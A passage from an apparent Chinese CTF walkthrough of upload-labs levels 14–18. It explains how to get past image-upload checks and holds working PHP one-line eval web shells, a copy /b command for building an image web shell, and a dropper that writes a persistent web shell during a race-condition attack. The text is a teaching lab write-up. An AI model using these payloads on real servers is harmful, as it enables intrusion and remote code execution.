style="zoom:75%"><p>当然实际编码为 <kbd>GBK</kbd>，因为我的电脑是简体中文版的。</p></li><li><p>因此，我们直接编辑一个只含有文件头加 PHP 代码的文本文件。合法的文件头的十六进制数值有三种，<kbd>.jpg</kbd> 的 <kbd>FFD8FF</kbd>，<kbd>.png</kbd> 的 <kbd>89504E47</kbd> 以及 <kbd>.gif</kbd> 的 <kbd>47494638</kbd>。可以在 <kbd>UltraEdit</kbd> 的十六进制模式下直接将文件头值写入，当然并不建议这样做，既然选择直接构建文本，直接输入文件头数值对应的字符不就好了。</p></li><li><p>话虽这么说，就像前面所看到的，数值对应的字符实际上我们并不能直接输入：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2f95b84.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/15/6280fa2c9d8a8.webp" alt="" style="zoom:75%"><p>点表示无法显示的字符，也就是说 <code>.png</code> 和 <code>.jpg</code> 文件显然不能直接输入字符完成了。但是还有一个“友好”的格式：<code>.gif</code></p><img src="https://bu.dusays.com/2022/05/15/6280fa4193e68.webp" alt="" style="zoom:75%"><p>可以看到，他的文件头的字符就是 <kbd>GIF89a</kbd> ，因此我们的文本内容可以直接为 <code>GIF89a &lt;?php @eval($_POST[&quot;h-t-m&quot;]);?&gt;</code> 。为了方便查看木马执行情况，在一句话木马中我们加入 <kbd>phpinfo();</kbd> 用于在页面中显示 PHP 环境信息，也就是 <code>GIF89a &lt;?php @eval($_POST[&quot;h-t-m&quot;]);phpinfo();?&gt;</code> . 当然，由于只检查两个字节，因此 <kbd>GIF89a</kbd> 也不用完全输入，这里保持文件头完整性，<psw>一不小心还兼容了下一关</psw>。</p></li><li><p>只要编码正确，后缀名他又不检查，因此，我们的文件直接使用 <kbd>.php</kbd> 后缀也没事：</p><img src="https://bu.dusays.com/2022/05/15/6280fa445a84f.webp" alt="" style="zoom:75%"><p>显然我的 PHP 文件已经进入编译器时代了（指图标）。</p></li><li><p>上传文件，完成！</p><img src="https://bu.dusays.com/2022/05/15/6280fa44f223b.webp" alt="" style="zoom:75%"><p>可以看到文件已经被识别为 GIF 文件并且重命名好放在 <kbd>upload</kbd> 目录下了：</p><img src="https://bu.dusays.com/2022/05/15/6280fa459ee23.webp" alt="" style="zoom:75%"></li></ul></li><li><p>不急，再讨论一下第一种方法，把代码放入图片文件中。</p><ul><li><p>理论上只需要在记事本中打开并添加代码即可。使用记事本打开图像时，他实际上并不能正确识别如图像等非文本文件，记事本只是简单地将字节流视为 <kbd>ANSI</kbd> 编码的文本打开。当然这对文件不会造成太大影响，但是重点在于，当你保存文件时，记事本不会保留特殊字符，也就是说，无论你是否对内容进行操作，记事本都会以 <kbd>ANSI</kbd> 的标准修改数据。例如替换映射特殊/未定义/禁止字符的字节，因为它们对于有效的 <kbd>ANSI</kbd> 文本没有意义，或者将空字符、行尾和文件序列结尾重新编码为 Windows / DOS 约定（如 Windows 系统中行尾使用两个字符表示：<kbd>CRLF</kbd>，即回车和换行）。关于 <kbd>ANSI</kbd> 的更多讨论可以 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/701882/what-is-ansi-format">参考这里</a> ，我们只需意识到，使用记事本对图片进行修改是绝对不可取的，即使你不做修改。</p></li><li><p>我们可以使用 <kbd>NotePad++</kbd> 或者 <kbd>UltraEdit</kbd> 等可以完成十六进制编辑的编辑器进行修改，只要保持文件头，我们可以在任意位置插入木马：</p><img src="https://bu.dusays.com/2022/05/15/6280fa467f3ce.webp" alt="" style="zoom:75%"></li><li><p>不过还有一种更加优雅的方式，就是在命令行中使用 <kbd>copy</kbd> 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy [图片文件名] /b + [木马文件名] /a [合成后的文件名]</span><br></pre></td></tr></table></figure><kbd>/b</kbd> 意为使用二进制打开文件，<kbd>/a</kbd> 意为使用文本方式打开文件，因此上述指令的意思就是，打开二进制流图片并在后方接入木马文本内容，合成的文件以最后的参数作为文件名另存。 <img src="https://bu.dusays.com/2022/05/15/6280fa477886e.webp" alt="" style="zoom:75%"><p>可以在编辑器中验证合成的结果：</p><img src="https://bu.dusays.com/2022/05/15/6280fa48321cf.webp" alt="" style="zoom:75%"></li><li><p>上传修改后的图片文件，成功！</p><img src="https://bu.dusays.com/2022/05/15/6280fa44f223b.webp" alt="" style="zoom:75%"><p>当然，一个小建议是使用较<strong>小</strong>的图片文件，毕竟图片只是个借口，何况图片中的字符多了我们也把控不住！</p></li></ul></li></ul><h3 id="夺旗-13">夺旗</h3><ul><li><p>经上文分析，将构造好的文件上传至服务器后，在含有文件包含漏洞的页面 URL 后添加 <kbd>?file=[文件路径]</kbd> 即可，点开题目中的漏洞链接即可值得漏洞文件所在的地址，即在网页根目录处：</p><p><img src="https://bu.dusays.com/2022/05/15/6280fa2a23406.webp" alt="" style="zoom:25%"> <img src="https://bu.dusays.com/2022/05/15/6280fa2e18d8e.webp" alt="" style="zoom:25%"></p><p>为了直观验证木马执行情况，我们在一句话木马代码中预留了 <kbd>phpinfo()</kbd>，因此直接打开页面即可观察到：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2b48707.webp" alt="" style="zoom:75%"><p>显示了 PHP 的信息，因此木马成功被包含并执行了！</p></li><li><p>那么接下来就是蚁剑连接了，值得注意的是，我们的链接应该指向代码作用之处。之前的关卡由于代码直接就执行了，因此连接到文件即可，而这一次代码是被包含到 <kbd>include.php</kbd> 之后才被执行的，因此应指向<strong>包含木马后</strong>的 <kbd>include.php</kbd> 文件，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机地址]/include.php?file=upload/[文件名]</span><br></pre></td></tr></table></figure></li><li><p>创建连接，显然是应该成功的。</p><img src="https://bu.dusays.com/2022/05/15/6280fa2ecb8da.webp" alt="" style="zoom:75%"></li><li><p>夺旗！连接成功了就行，想必本地目录也看累了，既然无旗可夺，不如看个视频放松一下。</p><iframe src="//player.bilibili.com/player.html?aid=768208334&bvid=BV1Ar4y1H7bk&cid=574525358&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe></li></ul><h2 id="Pass-15">Pass-15</h2><h3 id="启动靶机-25">启动靶机</h3><ul><li><p>来了来了第 15 关</p><img src="https://bu.dusays.com/2022/05/16/6282624230e7c.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-10">研究页面</h3><ul><li><p>直接看提示</p><img src="https://bu.dusays.com/2022/05/16/62826245609c3.webp" alt="" style="zoom:75%"><p>使用 <kbd>getimagesize()</kbd> 检查图片文件。</p></li><li><kbd>getimagesize()</kbd> 函数用于获取图像大小及相关信息，成功就会返回一个具有四个单元的数组。索引 0 包含图像宽度的像素值，索引 1 包含图像高度的像素值。索引 2 是图像类型的标记：1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM。这些标记与 PHP 4.3.0 新加的 IMAGETYPE 常量对应。索引 3 是文本字符串，内容为“height="yyy" width="xxx"”，可直接用于 IMG 标记。更多关于该函数可以 [参考这里](https://www.php.net/manual/zh/function.getimagesize.php) 。</li><li><p>查看源码，关键代码为这部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这里使用了 <kbd>getimagesize()</kbd> 函数返回的数组的第三个元素，也就是图像类型。</p></li><li><p>不难看出，本关与 Pass-14 极其相似，不同之处仅仅在于 Pass-14 仅检查文件头两个字节，而本关会检查完整的类型。不过，Pass-14 中的所有方法都包含了完整的文件头，因此本题可直接使用使用。</p></li></ul><h3 id="突破限制-16">突破限制</h3><ul><li><p>随机选择一种 Pass-14 的方法，将文件上传靶机，成功。</p><img src="https://bu.dusays.com/2022/05/16/6282624191294.webp" alt="" style="zoom:50%"></li><li><p>打开文件包含漏洞的文件，BUU 中依旧会出现问题，但是这次就不换本地靶机，因为我怀疑这个问题不影响使用。</p><img src="https://bu.dusays.com/2022/05/16/62826243e20dd.webp" alt="" style="zoom:75%"></li><li><p>在漏洞 URL 后加上 <kbd>?file=upload/[文件名]</kbd> ，当然，上回书说到，服务器会对文件重新以数字序列命名保存，因此切勿使用本地上传时的本地文件名。回车后，果然 BUU 靶机的那个错误并不影响使用，正确显示了 <kbd>phpinfo()</kbd>：</p><img src="https://bu.dusays.com/2022/05/16/62826246ba354.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-14">夺旗</h3><ul><li><p>蚁剑连接，与 Pass-14 同款链接（木马执行处）。成功！</p><img src="https://bu.dusays.com/2022/05/16/6282624867cbf.webp" alt="" style="zoom:75%"></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/16/628262497ebd0.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-16">Pass-16</h2><h3 id="启动靶机-26">启动靶机</h3><ul><li><p>没几关了，加油网安人</p><img src="https://bu.dusays.com/2022/05/19/6286268308929.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-11">研究页面</h3><ul><li><p>直接看提示</p><img src="https://bu.dusays.com/2022/05/19/6286267c3d1e7.webp" alt="" style="zoom:75%"><p>使用 <kbd>exif_imagetype()</kbd> 检查文件类型。</p></li><li><kbd>exif_imagetype()</kbd> 读取一个图像的第一个字节并检查其签名。当然，这个函数需要开启 <kbd>php_exif</kbd> 模块，在 BUU 平台本关依然没有开启相应模块，因此本关依旧部署于本地。在 <kbd>phpstudy</kbd> 中自带的 <kbd>php</kbd> 版本中直接勾选 <kbd>php_exif</kbd> 模块即可，也可能叫 <kbd>exif</kbd>，都是一样的： <img src="https://bu.dusays.com/2022/05/19/6286268b03a54.webp" alt="" style="zoom:75%"></li><li><p>但是，由于我使用的版本是自己下载的，就无法这样快捷设置了，因此这里示范修改配置。在 Pass-12 中因为版本问题而从官方下载了 <kbd>php 5.2.10</kbd> 的包，当时有个疑问，就是根目录并没有 <kbd>php.ini</kbd> 配置文件。由于当时只是需要修改参数值，因此我就直接新建了 <kbd>php.ini</kbd> 文件并输入修改配置。但是呢，其实官方包不仅不会没有配置文件，甚至还有两个，就是他们：</p><img src="https://bu.dusays.com/2022/05/19/6286268c32212.webp" alt="" style="zoom:75%"><p>而 <kbd>php.ini-dist</kbd> 文件的开始就是这么一段话：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">;;;;;;;;;;;</span><br><span class="line">; WARNING ;</span><br><span class="line">;;;;;;;;;;;</span><br><span class="line">; This is the <span class="keyword">default</span> settings file <span class="keyword">for</span> <span class="keyword">new</span> PHP installations.</span><br><span class="line">; By <span class="keyword">default</span>, PHP installs itself with a configuration suitable <span class="keyword">for</span></span><br><span class="line">; development purposes, <span class="keyword">and</span> *NOT* <span class="keyword">for</span> production purposes.</span><br><span class="line">; <span class="keyword">For</span> several security-oriented considerations that should be taken</span><br><span class="line">; before going online with your site, please consult php.ini-recommended</span><br><span class="line">; <span class="keyword">and</span> http:<span class="comment">//php.net/manual/en/security.php.</span></span><br></pre></td></tr></table></figure><p>也就是说，<kbd>php.ini-dist</kbd> 的安全等级较 <kbd>php.ini-recommended</kbd> 低，开发者安装时默认为 <kbd>php.ini-dist</kbd>。当然他们的具体区别与本关的关系不大，我们只需将其中任意一个文件的内容保存至 <kbd>php.ini</kbd> 文件中即可，这样以后所有的配置都只需修改该文件内容即可。需要注意的一点是，如本关这样需要添加扩展的配置，切记在配置文件中要加上扩展所在路径，一般在 <kbd>php</kbd> 下的 <kbd>ext</kbd> 目录中，只需修改文件中的 <kbd>extension_dir</kbd> 值即可：</p><img src="https://bu.dusays.com/2022/05/19/6286268eabd46.webp" alt="" style="zoom:75%"><p>如果不修改路径就直接进行配置，那么你将会收到一个服务器 500 错误：</p><img src="https://bu.dusays.com/2022/05/19/6286268d93d9b.webp" alt="" style="zoom:75%"><p>对于开启 <kbd>exif</kbd> 可以参考官网对应的 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exif.configuration.php">配置说明</a> ：</p><img src="https://bu.dusays.com/2022/05/19/628626901b7ca.webp" alt="" style="zoom:75%"><p>也就是说，我们需要删除 <kbd>extension=php_exif.dll</kbd> 和 <kbd>extension=php_mbstring.dll</kbd> 前的分号（即取消注释），由于 <kbd>extension=php_exif.dll</kbd> 默认置于 <kbd>extension=php_mbstring.dll</kbd> 之前，因此需要修改顺序，将 <kbd>extension=php_mbstring.dll</kbd> 放至前方优先加载，此外在配置文件的 <kbd>exif</kbd> 部分，也需要将所有配置内容取消注释：</p><img src="https://bu.dusays.com/2022/05/19/628626918be31.webp" alt="" style="zoom:75%"><p>这样，就完成了配置。哦对了，事实证明，当我们创建好完整的配置文件之后（路径也配置好），<kbd>phpstudy</kbd> 就可以快捷配置了，不需要一个个去取消注释，直接勾选即可（参照上一条）。虽然有点不信，但不得不说，进行到 <strong>16</strong> 关了，竟然才刚完成本地配置，惭愧惭愧。</p></li><li><p>如何判断配置有没有生效呢，显然生效了才能上传文件，如果不生效，则会收到一个静默的页面：</p><img src="https://bu.dusays.com/2022/05/19/62862692db607.webp" alt="" style="zoom:75%"></li></ul><h3 id="突破限制-17">突破限制</h3><ul><li><p>由于 <kbd>exif_imagetype()</kbd> 函数只检查一个字节，因此前面关卡的所有解法都绰绰有余，不得不说这个函数，<psw>你好大的官威啊</psw>。这里直接上传文件，成功。</p><img src="https://bu.dusays.com/2022/05/19/62862693d7eb4.webp" alt="" style="zoom:75%"></li><li><p>向漏洞文件传参，木马成功执行！</p><img src="https://bu.dusays.com/2022/05/19/6286269507e2f.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-15">夺旗</h3><ul><li><p>还是意思一下，蚁剑连接！（依然还是那款链接）</p><img src="https://bu.dusays.com/2022/05/19/628626960ca63.webp" alt="" style="zoom:75%"></li><li><p>本地无旗，反正目录不好看，再看个视频放松一下</p><div style="position:relative;width:100%;height:0;padding-bottom:75%"><iframe src="//player.bilibili.com/player.html?aid=684066279&bvid=BV1YU4y1m7qn&cid=719772987&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe></div></li></ul><h2 id="Pass-17">Pass-17</h2><h3 id="启动靶机-27">启动靶机</h3><ul><li><p>最后一个图片马了！</p><img src="https://bu.dusays.com/2022/05/19/62862697d6ebd.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-12">研究页面</h3><ul><li><p>先看提示：</p><img src="https://bu.dusays.com/2022/05/19/6286269940e02.webp" alt="" style="zoom:75%"><p>重新渲染了图片？有意思，看不懂。</p></li><li><p>看看源代码，代码较长，其实大多重复，看这一段即可：</p><img src="https://bu.dusays.com/2022/05/19/6286269a41935.webp" alt="" style="zoom:75%"><p>作者在代码中给了较为详细的注释，大致过程就是先获取上传文件的文件类型和文件名等，文件类型可参考 <a href="#Pass-02">Pass-02</a> ，通过文件类型与文件名的比对以分别使用对应的重渲染函数，当然伪造的后缀与文件类型会导致渲染函数返回 <kbd>false</kbd>，因此文件必须合法。虽然文件上传后才作检测，但是不合法的文件均会通过 <kbd>@unlink()</kbd> 函数删除。</p></li><li><p>我们需要注意的地方就是执行重新渲染的函数，也就是图中的这句以及其他两种类型的对应函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);  <span class="comment">// .jpg</span></span><br><span class="line"><span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);   <span class="comment">// .png</span></span><br><span class="line"><span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);   <span class="comment">// .gif</span></span><br></pre></td></tr></table></figure><p>这些函数会将对应文件进行重新渲染，也就是说，我们需要想办法让渲染后的文件中依然含有木马代码，这就有点麻烦了！</p></li><li><p>我们有必要好好了解一下 <kbd>.jpg</kbd> 、<kbd>.png</kbd> 和 <kbd>.gif</kbd>.</p><ul><li><p>先从简单的说起，<kbd>.gif</kbd> 文件：GIF</p><p>之前说到，GIF 的文件头为 <kbd>47494638</kbd>，对应字符为 <kbd>GIF8</kbd>，但我们之前都是直接用 <kbd>GIF89a</kbd>，这是 GIF 的一个版本，<kbd>89</kbd> 代表发布年份，还有另一个版本是 <kbd>GIF87a</kbd>，这六个字符便构成了文件的第一个部分——<strong>Header</strong>, 这部分是绝对不会更改的，当然本关我们也没办法利用。后面接的就是文件数据流部分，对数据流的结构这里不作分析，可参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/wzy198852/article/details/17266507">这篇文章</a> 详细解析。</p><p>需要注意的是，GIF 使用 LZW 压缩算法，用于信息的无损压缩，而就是因为无损，数据流中的许多数据都不会在重新渲染时被修改，当然我们不必去了解哪部分被保留，只需上传文件后再下载，在不变的数据中插入木马即可。当然实际原理会更复杂一些，这里不作解释。</p></li><li><p>再看 <kbd>.png</kbd> 文件：PNG</p><p>还是之前说到，PNG 的文件头为 <kbd>89504E47</kbd>，但其实这并不完整，PNG 的文件头实际是固定的 <kbd>89504E470D0A1A0A</kbd> 这八个字节构成。而剩下部分则由 3 个以上的数据块构成，其中 <kbd>IHDR</kbd>、<kbd>IDAT</kbd>、<kbd>IEND</kbd> 是必须有的三个关键数据块，分别表示文件头数据块、图像数据块和图像结束数据块，此外还有一个可选的关键数据块 <kbd>PLTE</kbd>，表示调色板数据块。当然还有许许多多的辅助数据块，这里就不涉及了，可参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lidabo/p/3701197.html">这篇文章</a> 详细解析。</p><p>我们需要知道的是，每个数据块都由 <kbd>Length (长度)</kbd>、<kbd>Chunk Type Code (数据块类型码)</kbd> 、<kbd>Chunk Data (数据块数据)</kbd>、<kbd>CRC (循环冗余检测)</kbd>，其中重点在于最后的 <kbd>CRC</kbd> ，他是用来检测是否有错误的循环冗余码。相当于，只要内容被修改了，大概率可以 <kbd>CRC</kbd> 检测出来。而 php 处理 PNG 图片文件时，就会首先检验 <kbd>CRC</kbd> 以及长度，若不正确就有理由怀疑你放毒，就会报错。因此，若在 PNG 图片中藏木马，则应一并修改所属数据块的 <kbd>CRC</kbd> 及长度。 此外，许多数据块都具有相对固定的格式与长度，显然我们无法以这类数据块为目标。</p></li><li><p>最后就是 <kbd>.jpg</kbd> 文件：JPG</p><p>依然之前说到，JPG 的文件头为 <kbd>FFD8FF</kbd>，事实上这依然不严格。JPG 文件由八个部分组成，每个部分称为『段』，每个段的头两个字节作为标记，其中首字节固定为 <kbd>FF</kbd> ，因此上述文件头实际是 JPG 文件头段 <kbd>FFD8</kbd> 与后续部分的首字节相连形成，其中 <kbd>D8</kbd> 为文件头的标记码。段与段之间可以有多个 <kbd>FF</kbd> 且会自动忽略取最后一个。除了文件头段与文件尾段仅含标记码用来标记段类型，其余所有段的结构均为 <code>段标识（FF）+段类型（标记码）+段长度+段内容</code>，其中段长度占两个字节，包括段内容和段长度本身，不包括段标识和段类型。关于各个段更加详细的内容，这里依然不多赘述，可参考 <a target="_blank" rel="noopener" href="https://wenku.baidu.com/view/8ea0fbfb04a1b0717fd5dd57.html">这篇文档</a> 详细解析。</p><p>我们需要知道的是，JPG 文件使用有损压缩，因此即使能正常嵌入文件，也需要保证重渲染后木马不会被改变。</p></li></ul></li></ul><h3 id="突破限制-18">突破限制</h3><ul><li><p>重渲染用到的 <kbd>imagecreatefrom*</kbd> 函数需要 <kbd>GD</kbd> 库的支持，很遗憾 BUU 依然没有执行这项配置，因此本关依然部署于本地，在 <kbd>phpstudy</kbd> 中只需将 <kbd>php_gd2</kbd> 勾选即可，更多详细配置可 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/image.installation.php">参考这里</a> 。</p><img src="https://bu.dusays.com/2022/05/19/6286269bdd968.webp" alt="" style="zoom:75%"></li><li><p>分别用三种图片进行图片马的构建</p><ul><li><p>GIF</p><p>构建 GIF 图片码会相对简单，上传下载再比较，好家伙图片直接静态了。</p><center><img src="https://bu.dusays.com/2022/05/19/6286269d4a3fa.gif" alt="" style="zoom:75%"><div style="display:inline-block;padding:2px;border-bottom:1px solid #d9d9d9;font-size:75%">原 GIF 文件</div></center><center><img src="https://bu.dusays.com/2022/05/19/62862671b6d27.gif" alt="" style="zoom:75%"><div style="display:inline-block;padding:2px;border-bottom:1px solid #d9d9d9;font-size:75%">重渲染 GIF 文件</div></center><p>将两个文件在 <kbd>UltraCompare</kbd> 中打开，可以看到前排的数据大部分都保留完好，因此基本可以将木马放在这部分。</p><img src="https://bu.dusays.com/2022/05/19/628626722bf92.webp" alt="" style="zoom:75%"><p>随机插入一个位置，保存后继续上传，打开后貌似失败了，继续对比数据内容，发现木马数据被拎出来了。</p><img src="https://bu.dusays.com/2022/05/19/628626760644f.webp" alt="" style="zoom:75%"><p>遇到这种情况呢，那没办法，得换个位置。于是乎又尝试了几次，最后还是成功了！</p><img src="https://bu.dusays.com/2022/05/19/628626784b988.webp" alt="" style="zoom:75%"></li><li><p>PNG</p><p>对于 PNG 文件，基本要使用脚本进行编辑，网络上可以找到许多代码，由于我暂时无法自主实现，<psw>太菜了</psw>，因此不作展示。</p></li><li><p>JPG</p><p>不作展示，理由同上。</p></li></ul></li></ul><h3 id="夺旗-16">夺旗</h3><ul><li><p>很遗憾，只完成了一个文件，不过还好这并不影响结果，蚁剑连接，成功！</p><img src="https://bu.dusays.com/2022/05/19/62862689b7fb8.webp" alt="" style="zoom:75%"></li><li><p>本地无旗，我们看视频</p><div style="position:relative;width:100%;height:0;padding-bottom:75%"><iframe src="//player.bilibili.com/player.html?aid=683649447&bvid=BV1aS4y1w7Lg&cid=711353293&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe></div></li></ul><h2 id="Pass-18">Pass-18</h2><h3 id="启动靶机-28">启动靶机</h3><ul><li><p>又回到这个页面了就是说，最近由于 BUU 抽风，网页有点不稳定，因此最后四关默认本地部署，也就是再无 flag 了。</p><img src="https://bu.dusays.com/2022/05/20/628773707b1b4.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究环境">研究环境</h3><ul><li><p>先看提示</p><img src="https://bu.dusays.com/2022/05/20/62877373637bb.webp" alt="" style="zoom:75%"></li><li><p>既然盛情邀请，那就恭敬不如从命，看源码！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="comment">// 构造白名单</span></span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="comment">// 读取文件名</span></span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="comment">// 读取临时文件名</span></span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 读取文件后缀名</span></span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="comment">// 确定上传路径，使用获取到的文件名</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">            <span class="comment">// 判断后缀名是否在白名单中</span></span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">            <span class="comment">// 为文件随机重命名</span></span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>为方便解读我在代码中添加了注释，仅仅是单纯的上传后比对白名单后重命名。如果利用文件包含漏洞的话，本关可以轻易完成，因为程序只检查后缀名，因此直接将木马文件的后缀名修改为任一合法后缀名然后文件包含即可。不过本关应该值得更优雅的方法，大致思路是，由于程序会优先完成上传动作，而数量多了后续检查后缀名就无法快速完成，那我们快速上传一堆木马文件，就会留出足够的时间让我们完成入侵。这就是条件竞争。</p></li><li><p>不过，假设文件访问成功了，但是过不了多久还是会被删除，而失去了木马文件侵略也就失效了，为此我们可以修改以下木马文件。既然访问木马文件就会执行里面的程序，那如果程序中含有能生成新的木马文件的代码呢，这样只要成功访问一次上传的木马，就相当于在服务器中永久植入了木马！因此，修改木马内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;h-t-m-2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;h-t-m&quot;]);phpinfo();?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><kbd>fopen()</kbd> 函数用于打开文件，如果文件不存在则创建新文件，而 <kbd>fputs()</kbd> 则会将字符串写入文件中，而字符串的内容就是我们熟悉的一句话木马了，值得注意的是新创建的文件一定不能与上传的木马文件名相同，毕竟删除是基于文件名的。</li></ul><h3 id="突破限制-19">突破限制</h3><ul><li><p>短时间重复多次上传，手动肯定是来不及的，因此在 <kbd>Burp Suite</kbd> 中打开靶机，直接上传文件抓包，右键 <kbd>send to Intruder</kbd>.</p><img src="https://bu.dusays.com/2022/05/20/62877375946bf.webp" alt="" style="zoom:75%"></li><li><p>在 <kbd>Intruder</kbd> 下的 <kbd>Positions</kbd> 页面就可以看到我们上传文件抓到的包了，现在我们只需一直发送这个包即可。首先在 <kbd>Positions</kbd> 页面点击 <kbd>clear §</kbd> 其中 <kbd>§</kbd> 用于包裹有效荷载，由于我们不需要修改，因此删除 <kbd>§</kbd>.</p><img src="https://bu.dusays.com/2022/05/20/628773772b834.webp" alt="" style="zoom:75%"></li><li><p>之后转到 <kbd>Payloads</kbd> 页面修改 <kbd>Payload type</kbd> 同样因为我们不需要修改有效荷载，因此选择 <kbd>Null payloads</kbd>.</p><img 